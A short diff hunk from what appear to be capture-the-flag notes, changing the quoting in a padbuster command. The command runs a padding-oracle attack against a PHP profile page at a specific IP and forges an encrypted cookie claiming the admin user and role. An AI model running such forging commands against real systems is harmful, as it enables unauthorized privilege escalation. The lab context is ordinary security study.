@@ -861,7 +861,7 @@ padbuster http://88.198.233.174:35082/profile.php yDMsIbvCzotYY7G2sLl6vH2zuah2qq
 
 Encryption
 ---------------
-padbuster http://88.198.233.174:35082/profile.php yDMsIbvCzotYY7G2sLl6vH2zuah2qqpMwt2+5Jo0VdAMHrKJ5/5Xe/67x/yfWJsWqRh3irfsreg= 8 -encoding 0 --cookie "iknowmag1k=yDMsIbvCzotYY7G2sLl6vH2zuah2qqpMwt2+5Jo0VdAMHrKJ5/5Xe/67x/yfWJsWqRh3irfsreg=;PHPSESSID=tdd5b0jl58sf70ve667r9n1et6" -plaintext {\"user\":\"admin\",\"role\":\"admin\"}
+padbuster http://88.198.233.174:35082/profile.php yDMsIbvCzotYY7G2sLl6vH2zuah2qqpMwt2+5Jo0VdAMHrKJ5/5Xe/67x/yfWJsWqRh3irfsreg= 8 -encoding 0 --cookie "iknowmag1k=yDMsIbvCzotYY7G2sLl6vH2zuah2qqpMwt2+5Jo0VdAMHrKJ5/5Xe/67x/yfWJsWqRh3irfsreg=;PHPSESSID=tdd5b0jl58sf70ve667r9n1et6" -plaintext "{\"user\":\"admin\",\"role\":\"admin\"}"
 
 
 RAW HASH
